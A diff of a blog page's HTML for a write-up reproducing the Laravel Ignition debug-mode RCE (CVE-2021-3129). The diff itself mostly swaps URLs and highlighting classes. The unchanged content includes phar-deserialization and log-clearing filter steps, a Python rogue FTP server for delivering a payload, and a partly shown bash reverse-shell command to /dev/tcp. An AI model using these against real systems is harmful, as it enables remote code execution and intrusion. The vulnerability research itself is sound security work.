@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Laravel Debug mode RCE - Theoyu</title>
 
 <meta name="description" content="0x01 前言Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。">
-<link rel="canonical" href="http://localhost:4000/2021/laravelRce"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<link rel="canonical" href="https://theoyu.top/2021/laravelRce"><link rel="alternate" type="application/rss+xml" title="Theoyu" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -637,7 +637,7 @@ php artisan serve   <span class="c"># 启动服务器</span>
 
 <p>之后访问<code class="language-plaintext highlighter-rouge">http://localhost:8000,</code>会抛出以下运行异常：No application encryption key has been specified.（未指定应用程序的APP_KEY加密密钥）：</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601233635369.png" alt="image-20210601233635369" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601233635369.png" alt="image-20210601233635369" /></p>
 
 <p>可以看到这时候 <code class="language-plaintext highlighter-rouge">Ignition</code>（Laravel 6+默认错误页面生成器）给我们提供了一个solutions，让我们在配置文件中给Laravel配置一个加密APP_KEY。</p>
 
@@ -645,13 +645,13 @@ php artisan serve   <span class="c"># 启动服务器</span>
 
 <p>可以看到<code class="language-plaintext highlighter-rouge">Ignition</code> 成功在配置文件.env中生成了一个key，而这也就是我们今天要注意的漏洞关键点。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601234219611.png" alt="image-20210601234219611" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601234219611.png" alt="image-20210601234219611" /></p>
 
 <h2 id="0x03-log写入phar触发反序列化">0x03 log写入phar触发反序列化</h2>
 
 <p>正如上面所说，debug模式中<code class="language-plaintext highlighter-rouge">ignition</code>附带了“一键修复bug”的功能,本次laravel这个漏洞其实就是发生在上面提到的 <code class="language-plaintext highlighter-rouge">Ignition</code>（&lt;=2.5.1）中，本次漏洞就是其中的<code class="language-plaintext highlighter-rouge">vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>中的参数过滤不严谨导致的。</p>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602213821629.png" alt="image-20210602213821629" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602213821629.png" alt="image-20210602213821629" /></p>
 
 <p>可以看到这里主要功能点是：读取一个给定的路径，并替换<code class="language-plaintext highlighter-rouge">$variableName</code>为<code class="language-plaintext highlighter-rouge">$variableName ?? ''</code>，之后写回文件中。
  由于这里调用了<code class="language-plaintext highlighter-rouge">file_get_contents()</code>，且其中的参数可控，所以这里可以通过<code class="language-plaintext highlighter-rouge">phar://</code>协议去触发phar反序列化。</p>
@@ -673,7 +673,7 @@ php artisan serve   <span class="c"># 启动服务器</span>
 </span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210601235046916.png" alt="image-20210601235046916" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210601235046916.png" alt="image-20210601235046916" /></p>
 
 <p>可以看到有报错，说明漏洞存在，我们现在开始复现。</p>
 
@@ -703,7 +703,7 @@ php artisan serve   <span class="c"># 启动服务器</span>
 </span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
 
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602002805556.png" alt="image-20210602002805556" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602002805556.png" alt="image-20210602002805556" /></p>
 
 <p>可以看到达到了RCE的效果。</p>
 
@@ -732,7 +732,7 @@ php artisan serve   <span class="c"># 启动服务器</span>
   <li>
     <p><code class="language-plaintext highlighter-rouge">convert.iconv.utf-8.utf-16be</code>(UTF-8 -&gt; UTF-16BE)</p>
 
-    <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220211795.png" alt="image-20210602220211795" /></p>
+    <p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220211795.png" alt="image-20210602220211795" /></p>
   </li>
   <li>
     <p><code class="language-plaintext highlighter-rouge">convert.quoted-printable-encode</code>(打印所有不可见字符)</p>
@@ -740,7 +740,7 @@ php artisan serve   <span class="c"># 启动服务器</span>
   <li>
     <p><code class="language-plaintext highlighter-rouge">convert.iconv.utf-16be.utf-8</code>(UTF-16BE -&gt; UTF-8)</p>
 
-    <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220559581.png" alt="image-20210602220559581" /></p>
+    <p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220559581.png" alt="image-20210602220559581" /></p>
 
     <p>可以看到经过这样操作后log文件中所有字符变成了非base64字符，这时候再使用<code class="language-plaintext highlighter-rouge">convert.base64-decode</code>过滤器就可以成功清空了。</p>
   </li>
@@ -782,7 +782,7 @@ php artisan serve   <span class="c"># 启动服务器</span>
   </span><span class="p">}</span><span class="w">
 </span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
-<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602221221071.png" alt="image-20210602221221071" /></p>
+<p><img src="https://testingcf.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602221221071.png" alt="image-20210602221221071" /></p>
 
 <p>接下来直接打就行。</p>
 
@@ -831,74 +831,74 @@ bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/ip/
 # @File    : ftp_redirect.py
 # @Software:
 </span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
 
 <span class="c1"># 对gopherus生成的payload进行一次urldecode
-</span><span class="n">payload</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="s">"payload"</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+</span><span class="n">payload</span> <span class="o">=</span> <span class="nf">unquote</span><span class="p">(</span><span class="s">"payload"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="s">'0.0.0.0'</span>
 <span class="n">port</span> <span class="o">=</span> <span class="mi">23</span>
-<span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
-<span class="n">sk</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
-<span class="n">sk</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
+<span class="n">sk</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+<span class="n">sk</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
 
 <span class="c1"># ftp被动模式的passvie port,监听到1234
-</span><span class="n">sk2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
-<span class="n">sk2</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="mi">1234</span><span class="p">))</span>
-<span class="n">sk2</span><span class="p">.</span><span class="n">listen</span><span class="p">()</span>
+</span><span class="n">sk2</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
+<span class="n">sk2</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="mi">1234</span><span class="p">))</span>
+<span class="n">sk2</span><span class="p">.</span><span class="nf">listen</span><span class="p">()</span>
 
 <span class="c1"># 计数器，用于区分是第几次ftp连接
 </span><span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>
 <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">conn</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
-    <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># USER aaa\r\n  客户端传来用户名
+    <span class="n">conn</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+    <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># USER aaa\r\n  客户端传来用户名
 </span>    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"220 ready</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"220 ready</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 ready</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 ready</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
 </span>    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"215 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"215 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># SIZE /123\r\n  客户端询问文件/123的大小
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># SIZE /123\r\n  客户端询问文件/123的大小
 </span>    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"213 3 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"213 3 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"300 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"300 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># EPSV\r\n'
-</span>    <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># EPSV\r\n'
+</span>    <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"200 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># PASV\r\n  客户端告诉服务端进入被动连接模式
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>   <span class="c1"># PASV\r\n  客户端告诉服务端进入被动连接模式
 </span>    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"227 127,0,0,1,4,210</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  <span class="c1"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"227 127,0,0,1,4,210</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  <span class="c1"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
 </span>    <span class="k">else</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"227 127,0,0,1,35,40</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  <span class="c1"># 端口计算规则：35*256+40=9000
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"227 127,0,0,1,35,40</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>  <span class="c1"># 端口计算规则：35*256+40=9000
 </span>
-    <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
+    <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>  <span class="c1"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
 </span>    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"125 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># 告诉客户端可以开始数据连接了
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"125 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># 告诉客户端可以开始数据连接了
 </span>        <span class="c1"># 新建一个socket给服务端返回我们的payload
-</span>        <span class="k">print</span><span class="p">(</span><span class="s">"建立连接!"</span><span class="p">)</span>
-        <span class="n">conn2</span><span class="p">,</span> <span class="n">address2</span> <span class="o">=</span> <span class="n">sk2</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
-        <span class="n">conn2</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-        <span class="n">conn2</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"断开连接!"</span><span class="p">)</span>
+</span>        <span class="nf">print</span><span class="p">(</span><span class="s">"建立连接!"</span><span class="p">)</span>
+        <span class="n">conn2</span><span class="p">,</span> <span class="n">address2</span> <span class="o">=</span> <span class="n">sk2</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+        <span class="n">conn2</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">conn2</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        <span class="nf">print</span><span class="p">(</span><span class="s">"断开连接!"</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"150 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>
-        <span class="nb">exit</span><span class="p">()</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"150 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>
+        <span class="nf">exit</span><span class="p">()</span>
 
     <span class="c1"># 第一次连接是下载文件，需要告诉客户端下载已经结束
 </span>    <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-        <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"226 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"226 </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
     <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
 
 </code></pre></div></div>
@@ -974,7 +974,7 @@ bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/ip/
   *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
   *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
   var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/2021/laravelRce';
+    this.page.url = 'https://theoyu.top/2021/laravelRce';
     this.page.identifier = 'Laravel Debug mode RCE';
   };
   (function() { // DON'T EDIT BELOW THIS LINE
